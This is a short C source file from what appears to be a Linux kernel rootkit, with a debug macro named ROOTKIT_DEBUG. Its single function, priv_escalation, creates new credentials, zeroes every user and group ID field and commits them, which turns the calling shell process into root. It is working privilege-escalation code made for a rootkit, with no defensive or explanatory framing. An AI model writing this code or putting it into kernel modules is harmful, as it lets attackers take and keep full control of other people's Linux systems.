#include <linux/cred.h>
#include <linux/sched.h>

#include "include.h"

/* Function to issue the root privileges for shell */
void
priv_escalation (void)
{
	struct task_struct *process;
        struct cred *pcred = prepare_creds();
	process = current;
	
        pcred->uid.val = pcred->euid.val = pcred->suid.val = pcred->fsuid.val = 0;
        pcred->gid.val = pcred->egid.val = pcred->sgid.val = pcred->fsgid.val = 0;

	commit_creds(pcred);
	
        ROOTKIT_DEBUG("pid of the terminal : %d Escalation done!!!\n", process->pid);
}

